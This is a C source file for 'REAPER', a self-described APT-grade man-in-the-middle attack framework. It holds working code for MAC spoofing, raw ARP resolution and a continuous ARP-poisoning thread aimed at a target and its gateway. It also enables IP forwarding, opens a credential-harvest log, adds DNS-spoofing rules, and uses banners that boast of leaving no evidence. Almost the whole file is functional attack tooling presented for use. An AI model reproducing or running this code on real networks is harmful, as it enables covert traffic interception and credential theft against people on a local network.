/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER MODULE - SILENT INTERCEPTION ENGINE
 *  APT-Grade MITM Attack Framework
 *  
 *  Features:
 *  - MAC spoofing
 *  - ARP poisoning with graceful restoration
 *  - Packet capture integration
 *  - DNS spoofing
 *  - HTTP injection
 *  - Multi-protocol credential harvesting
 *  
 *  Zero Dependencies | Full Stealth | Military Grade
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include "reaper_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>

// Include submodules
#include "reaper_capture.c"
#include "reaper_dns.c"
#include "reaper_http.c"
#include "reaper_harvest.c"

// External color definitions
extern const char* COLOR_RESET;
extern const char* COLOR_RED;
extern const char* COLOR_GREEN;
extern const char* COLOR_YELLOW;
extern const char* COLOR_BLUE;
extern const char* COLOR_MAGENTA;
extern const char* COLOR_CYAN;
extern const char* COLOR_WHITE;
extern const char* COLOR_BOLD;

#ifndef COLOR_RESET
#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[31m"
#define COLOR_GREEN   "\033[32m"
#define COLOR_YELLOW  "\033[33m"
#define COLOR_BLUE    "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN    "\033[36m"
#define COLOR_WHITE   "\033[37m"
#define COLOR_BOLD    "\033[1m"
#endif

// Global session
reaper_session_t* g_reaper_session = NULL;

// External utility functions
extern void get_default_interface(char* iface, int len);
extern int get_mac_address(const char* iface, unsigned char* mac);
extern int get_local_ip(char* ip_buf, int len);
extern int enable_ip_forward(void);
extern int disable_ip_forward(void);

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAC SPOOFING
 * ═══════════════════════════════════════════════════════════════════════════ */

static int change_mac_address(const char* iface, const uint8_t* new_mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    
    // Bring interface down
    if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
        close(fd);
        return -2;
    }
    
    ifr.ifr_flags &= ~IFF_UP;
    if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
        close(fd);
        return -3;
    }
    
    // Set new MAC
    ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
    memcpy(ifr.ifr_hwaddr.sa_data, new_mac, 6);
    
    if (ioctl(fd, SIOCSIFHWADDR, &ifr) < 0) {
        // Bring interface back up before returning error
        ifr.ifr_flags |= IFF_UP;
        ioctl(fd, SIOCSIFFLAGS, &ifr);
        close(fd);
        return -4;
    }
    
    // Bring interface back up
    ifr.ifr_flags |= IFF_UP;
    if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
        close(fd);
        return -5;
    }
    
    close(fd);
    
    // Wait for interface to stabilize
    usleep(500000);
    
    return 0;
}

int reaper_spoof_mac(const char* mac_str) {
    if (!g_reaper_session) {
        g_reaper_session = calloc(1, sizeof(reaper_session_t));
        reaper_session_init(g_reaper_session);
    }
    
    mac_spoof_state_t* state = &g_reaper_session->mac_state;
    
    // Get interface
    char iface[IFNAMSIZ];
    get_default_interface(iface, sizeof(iface));
    strncpy(state->interface, iface, IFNAMSIZ - 1);
    
    // Backup original MAC
    if (!state->is_spoofed) {
        get_mac_address(iface, state->original_mac);
    }
    
    // Generate or parse new MAC
    uint8_t new_mac[6];
    if (mac_str == NULL || strcasecmp(mac_str, "random") == 0) {
        reaper_generate_random_mac(new_mac);
    } else if (reaper_parse_mac(mac_str, new_mac) < 0) {
        return -1;
    }
    
    // Apply new MAC
    if (change_mac_address(iface, new_mac) < 0) {
        return -2;
    }
    
    memcpy(state->spoofed_mac, new_mac, 6);
    state->is_spoofed = true;
    
    return 0;
}

int reaper_restore_mac(void) {
    if (!g_reaper_session) return -1;
    
    mac_spoof_state_t* state = &g_reaper_session->mac_state;
    
    if (!state->is_spoofed) return 0;
    
    if (change_mac_address(state->interface, state->original_mac) < 0) {
        return -1;
    }
    
    state->is_spoofed = false;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ARP RESOLUTION (get MAC for IP)
 * ═══════════════════════════════════════════════════════════════════════════ */

static int resolve_mac(const char* iface, struct in_addr ip, uint8_t* mac_out) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) return -1;
    
    // Get our MAC and IP
    uint8_t our_mac[6];
    get_mac_address(iface, our_mac);
    
    char our_ip_str[32];
    get_local_ip(our_ip_str, sizeof(our_ip_str));
    struct in_addr our_ip;
    inet_pton(AF_INET, our_ip_str, &our_ip);
    
    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    int ifindex = ifr.ifr_ifindex;
    
    // Build ARP request
    uint8_t packet[42];
    struct ether_header* eth = (struct ether_header*)packet;
    struct ether_arp* arp = (struct ether_arp*)(packet + sizeof(struct ether_header));
    
    memset(eth->ether_dhost, 0xff, 6);  // Broadcast
    memcpy(eth->ether_shost, our_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);
    
    memcpy(arp->arp_sha, our_mac, 6);
    memcpy(arp->arp_spa, &our_ip.s_addr, 4);
    memset(arp->arp_tha, 0, 6);
    memcpy(arp->arp_tpa, &ip.s_addr, 4);
    
    // Send request
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    memset(sa.sll_addr, 0xff, 6);
    
    sendto(sock, packet, 42, 0, (struct sockaddr*)&sa, sizeof(sa));
    
    // Wait for response
    struct pollfd pfd = { .fd = sock, .events = POLLIN };
    
    for (int try = 0; try < 30; try++) {  // 3 second timeout
        int ret = poll(&pfd, 1, 100);
        if (ret <= 0) continue;
        
        uint8_t resp[128];
        ssize_t len = recv(sock, resp, sizeof(resp), 0);
        if (len < 42) continue;
        
        struct ether_arp* resp_arp = (struct ether_arp*)(resp + sizeof(struct ether_header));
        
        if (ntohs(resp_arp->ea_hdr.ar_op) == ARPOP_REPLY &&
            memcmp(resp_arp->arp_spa, &ip.s_addr, 4) == 0) {
            memcpy(mac_out, resp_arp->arp_sha, 6);
            close(sock);
            return 0;
        }
    }
    
    close(sock);
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ARP POISON PACKET BUILDER
 * ═══════════════════════════════════════════════════════════════════════════ */

static void build_arp_packet(uint8_t* packet,
                              const uint8_t* src_mac,
                              struct in_addr src_ip,
                              const uint8_t* dst_mac,
                              struct in_addr dst_ip,
                              int is_reply) {
    struct ether_header* eth = (struct ether_header*)packet;
    struct ether_arp* arp = (struct ether_arp*)(packet + sizeof(struct ether_header));
    
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(is_reply ? ARPOP_REPLY : ARPOP_REQUEST);
    
    memcpy(arp->arp_sha, src_mac, 6);
    memcpy(arp->arp_spa, &src_ip.s_addr, 4);
    memcpy(arp->arp_tha, dst_mac, 6);
    memcpy(arp->arp_tpa, &dst_ip.s_addr, 4);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ARP POISON THREAD
 * ═══════════════════════════════════════════════════════════════════════════ */

static void* reaper_poison_thread(void* arg) {
    reaper_session_t* session = (reaper_session_t*)arg;
    
    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, session->interface, IFNAMSIZ);
    ioctl(session->arp_sock, SIOCGIFINDEX, &ifr);
    int ifindex = ifr.ifr_ifindex;
    
    // Build poison packets
    uint8_t pkt_to_target[42];
    uint8_t pkt_to_gateway[42];
    
    // Tell target: gateway is at our MAC
    build_arp_packet(pkt_to_target, 
                     session->our_mac, session->gateway_ip,
                     session->target_mac, session->target_ip, 1);
    
    // Tell gateway: target is at our MAC
    build_arp_packet(pkt_to_gateway,
                     session->our_mac, session->target_ip,
                     session->gateway_mac, session->gateway_ip, 1);
    
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    
    session->start_time = time(NULL);
    
    while (session->running) {
        // Send to target
        memcpy(sa.sll_addr, session->target_mac, 6);
        sendto(session->arp_sock, pkt_to_target, 42, 0,
               (struct sockaddr*)&sa, sizeof(sa));
        
        // Send to gateway
        memcpy(sa.sll_addr, session->gateway_mac, 6);
        sendto(session->arp_sock, pkt_to_gateway, 42, 0,
               (struct sockaddr*)&sa, sizeof(sa));
        
        session->arp_packets_sent += 2;
        
        // Jitter: 200ms - 1500ms
        useconds_t delay = (rand() % 1300000) + 200000;
        usleep(delay);
    }
    
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  ARP RESTORATION (cleanup)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void restore_arp_tables(reaper_session_t* session) {
    struct ifreq ifr;
    strncpy(ifr.ifr_name, session->interface, IFNAMSIZ);
    ioctl(session->arp_sock, SIOCGIFINDEX, &ifr);
    int ifindex = ifr.ifr_ifindex;
    
    uint8_t pkt_restore_target[42];
    uint8_t pkt_restore_gateway[42];
    
    // Tell target: gateway is at gateway's real MAC
    build_arp_packet(pkt_restore_target,
                     session->gateway_mac, session->gateway_ip,
                     session->target_mac, session->target_ip, 1);
    
    // Tell gateway: target is at target's real MAC
    build_arp_packet(pkt_restore_gateway,
                     session->target_mac, session->target_ip,
                     session->gateway_mac, session->gateway_ip, 1);
    
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    
    // Send multiple times for reliability
    for (int i = 0; i < 5; i++) {
        memcpy(sa.sll_addr, session->target_mac, 6);
        sendto(session->arp_sock, pkt_restore_target, 42, 0,
               (struct sockaddr*)&sa, sizeof(sa));
        
        memcpy(sa.sll_addr, session->gateway_mac, 6);
        sendto(session->arp_sock, pkt_restore_gateway, 42, 0,
               (struct sockaddr*)&sa, sizeof(sa));
        
        usleep(100000);  // 100ms
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAIN INTERCEPT FUNCTION
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_intercept(const char* target_ip, const char* gateway_ip, reaper_mode_t mode) {
    printf("\n");
    printf(COLOR_RED COLOR_BOLD);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║          REAPER - SILENT INTERCEPTION ENGINE                 ║\n");
    printf("║     APT-Grade MITM | Zero Evidence | Military Operations     ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET "\n");
    
    // Initialize session
    if (g_reaper_session && g_reaper_session->running) {
        printf(COLOR_YELLOW "[!] Reaper already running. Use 'reaper stop' first.\n" COLOR_RESET);
        return -1;
    }
    
    if (!g_reaper_session) {
        g_reaper_session = calloc(1, sizeof(reaper_session_t));
    }
    reaper_session_init(g_reaper_session);
    g_reaper_session->mode = mode;
    
    // Parse targets
    if (inet_pton(AF_INET, target_ip, &g_reaper_session->target_ip) != 1) {
        printf(COLOR_RED "[!] Invalid target IP: %s\n" COLOR_RESET, target_ip);
        return -2;
    }
    if (inet_pton(AF_INET, gateway_ip, &g_reaper_session->gateway_ip) != 1) {
        printf(COLOR_RED "[!] Invalid gateway IP: %s\n" COLOR_RESET, gateway_ip);
        return -2;
    }
    
    // Get interface
    get_default_interface(g_reaper_session->interface, sizeof(g_reaper_session->interface));
    
    // Get our MAC
    if (g_reaper_session->mac_state.is_spoofed) {
        memcpy(g_reaper_session->our_mac, g_reaper_session->mac_state.spoofed_mac, 6);
    } else {
        get_mac_address(g_reaper_session->interface, g_reaper_session->our_mac);
    }
    
    // Get our IP
    char our_ip_str[32];
    get_local_ip(our_ip_str, sizeof(our_ip_str));
    inet_pton(AF_INET, our_ip_str, &g_reaper_session->our_ip);
    
    printf(COLOR_YELLOW "[*] Interface: %s\n" COLOR_RESET, g_reaper_session->interface);
    printf(COLOR_YELLOW "[*] Target:    %s\n" COLOR_RESET, target_ip);
    printf(COLOR_YELLOW "[*] Gateway:   %s\n" COLOR_RESET, gateway_ip);
    
    char mac_str[20];
    reaper_format_mac(g_reaper_session->our_mac, mac_str, sizeof(mac_str));
    printf(COLOR_YELLOW "[*] Our MAC:   %s%s\n" COLOR_RESET, mac_str,
           g_reaper_session->mac_state.is_spoofed ? " (SPOOFED)" : "");
    
    // Resolve target MAC
    printf(COLOR_YELLOW "[*] Resolving target MAC..." COLOR_RESET);
    fflush(stdout);
    if (resolve_mac(g_reaper_session->interface, g_reaper_session->target_ip, 
                    g_reaper_session->target_mac) < 0) {
        printf(COLOR_RED " FAILED\n" COLOR_RESET);
        printf(COLOR_RED "[!] Could not resolve target MAC. Target may be offline.\n" COLOR_RESET);
        return -3;
    }
    reaper_format_mac(g_reaper_session->target_mac, mac_str, sizeof(mac_str));
    printf(COLOR_GREEN " %s\n" COLOR_RESET, mac_str);
    
    // Resolve gateway MAC
    printf(COLOR_YELLOW "[*] Resolving gateway MAC..." COLOR_RESET);
    fflush(stdout);
    if (resolve_mac(g_reaper_session->interface, g_reaper_session->gateway_ip,
                    g_reaper_session->gateway_mac) < 0) {
        printf(COLOR_RED " FAILED\n" COLOR_RESET);
        printf(COLOR_RED "[!] Could not resolve gateway MAC. Gateway may be offline.\n" COLOR_RESET);
        return -4;
    }
    reaper_format_mac(g_reaper_session->gateway_mac, mac_str, sizeof(mac_str));
    printf(COLOR_GREEN " %s\n" COLOR_RESET, mac_str);
    
    // Enable IP forwarding
    if (mode != REAPER_MODE_DOS) {
        if (enable_ip_forward()) {
            printf(COLOR_GREEN "[+] IP forwarding enabled\n" COLOR_RESET);
        }
    }
    
    // Create ARP socket
    g_reaper_session->arp_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (g_reaper_session->arp_sock < 0) {
        printf(COLOR_RED "[!] Failed to create ARP socket. Run as root!\n" COLOR_RESET);
        return -5;
    }
    
    // Create inject socket
    g_reaper_session->inject_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    
    // Start credential log file
    char logfile[256];
    snprintf(logfile, sizeof(logfile), "reaper_creds_%ld.log", time(NULL));
    g_reaper_session->cred_store.logfile = fopen(logfile, "w");
    if (g_reaper_session->cred_store.logfile) {
        printf(COLOR_GREEN "[+] Credential log: %s\n" COLOR_RESET, logfile);
    }
    
    // Display active modes
    printf(COLOR_CYAN "\n[*] Active modes:\n" COLOR_RESET);
    if (mode & REAPER_MODE_DOS) printf("    ✓ ARP Poisoning (DoS)\n");
    if (mode & REAPER_MODE_INTERCEPT) printf("    ✓ Packet Capture\n");
    if (mode & REAPER_MODE_DNS_SPOOF) printf("    ✓ DNS Spoofing\n");
    if (mode & REAPER_MODE_HTTP_INJECT) printf("    ✓ HTTP Injection\n");
    if (mode & REAPER_MODE_HARVEST) printf("    ✓ Credential Harvesting\n");
    
    // Start threads
    g_reaper_session->running = 1;
    
    pthread_create(&g_reaper_session->poison_thread, NULL, 
                   reaper_poison_thread, g_reaper_session);
    
    if (mode & REAPER_MODE_INTERCEPT) {
        reaper_start_capture(g_reaper_session);
    }
    
    printf("\n");
    printf(COLOR_RED COLOR_BOLD);
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║   ⚠  INTERCEPTION ACTIVE - TARGET IS COMPROMISED  ⚠         ║\n");
    printf("║   Type 'reaper stop' to end attack and restore ARP          ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET "\n");
    
    pthread_detach(g_reaper_session->poison_thread);
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  STOP REAPER
 * ═══════════════════════════════════════════════════════════════════════════ */

void reaper_stop(void) {
    if (!g_reaper_session || !g_reaper_session->running) {
        printf(COLOR_YELLOW "[*] Reaper is not running.\n" COLOR_RESET);
        return;
    }
    
    printf(COLOR_YELLOW "[*] Stopping reaper..." COLOR_RESET "\n");
    
    // Stop running flag
    g_reaper_session->running = 0;
    usleep(200000);  // Let threads notice
    
    // Restore ARP tables
    printf(COLOR_YELLOW "[*] Restoring ARP tables..." COLOR_RESET);
    fflush(stdout);
    restore_arp_tables(g_reaper_session);
    printf(COLOR_GREEN " Done\n" COLOR_RESET);
    
    // Stop capture
    reaper_stop_capture(g_reaper_session);
    
    // Disable IP forwarding
    disable_ip_forward();
    
    // Show statistics
    time_t duration = time(NULL) - g_reaper_session->start_time;
    if (duration == 0) duration = 1;
    
    printf("\n");
    printf(COLOR_CYAN "╔════════════════════════════════════════════════════════════╗\n");
    printf("║                    REAPER STATISTICS                        ║\n");
    printf("╚════════════════════════════════════════════════════════════╝" COLOR_RESET "\n");
    printf("  Duration:           %ld seconds\n", duration);
    printf("  ARP packets:        %lu\n", g_reaper_session->arp_packets_sent);
    printf("  Packets captured:   %lu\n", g_reaper_session->packets_captured);
    printf("  DNS spoofed:        %lu\n", g_reaper_session->dns_spoofed);
    printf("  Credentials:        %lu\n", g_reaper_session->creds_harvested);
    printf("\n");
    
    // Show credentials if any
    if (g_reaper_session->creds_harvested > 0) {
        reaper_print_credentials(g_reaper_session);
    }
    
    // Cleanup
    reaper_session_destroy(g_reaper_session);
    free(g_reaper_session);
    g_reaper_session = NULL;
    
    printf(COLOR_GREEN "[+] Reaper stopped. Evidence minimized.\n" COLOR_RESET "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  LEGACY POISON FUNCTION (for compatibility)
 * ═══════════════════════════════════════════════════════════════════════════ */

void reaper_poison(const char* target_ip, const char* gateway_ip) {
    reaper_intercept(target_ip, gateway_ip, REAPER_MODE_DOS | REAPER_MODE_HARVEST);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  STATUS CHECK
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_is_running(void) {
    return g_reaper_session && g_reaper_session->running;
}

void reaper_status(void) {
    if (!g_reaper_session || !g_reaper_session->running) {
        printf(COLOR_YELLOW "[*] Reaper is not running.\n" COLOR_RESET);
        return;
    }
    
    time_t duration = time(NULL) - g_reaper_session->start_time;
    
    printf("\n");
    printf(COLOR_CYAN "╔════════════════════════════════════════════════════════════╗\n");
    printf("║                    REAPER STATUS                            ║\n");
    printf("╚════════════════════════════════════════════════════════════╝" COLOR_RESET "\n");
    printf("  Target:             %s\n", inet_ntoa(g_reaper_session->target_ip));
    printf("  Gateway:            %s\n", inet_ntoa(g_reaper_session->gateway_ip));
    printf("  Duration:           %ld seconds\n", duration);
    printf("  ARP packets:        %lu\n", g_reaper_session->arp_packets_sent);
    printf("  Packets captured:   %lu\n", g_reaper_session->packets_captured);
    printf("  DNS spoofed:        %lu\n", g_reaper_session->dns_spoofed);
    printf("  Credentials:        %lu\n", g_reaper_session->creds_harvested);
    
    if (g_reaper_session->mac_state.is_spoofed) {
        char mac_str[20];
        reaper_format_mac(g_reaper_session->mac_state.spoofed_mac, mac_str, sizeof(mac_str));
        printf("  Spoofed MAC:        %s\n", mac_str);
    }
    
    printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS SPOOF COMMAND
 * ═══════════════════════════════════════════════════════════════════════════ */

void reaper_dns_add(const char* domain, const char* ip) {
    if (!g_reaper_session) {
        g_reaper_session = calloc(1, sizeof(reaper_session_t));
        reaper_session_init(g_reaper_session);
    }
    
    if (reaper_add_dns_rule(g_reaper_session, domain, ip) == 0) {
        printf(COLOR_GREEN "[+] DNS rule added: %s → %s\n" COLOR_RESET, domain, ip);
    } else {
        printf(COLOR_RED "[!] Failed to add DNS rule\n" COLOR_RESET);
    }
}
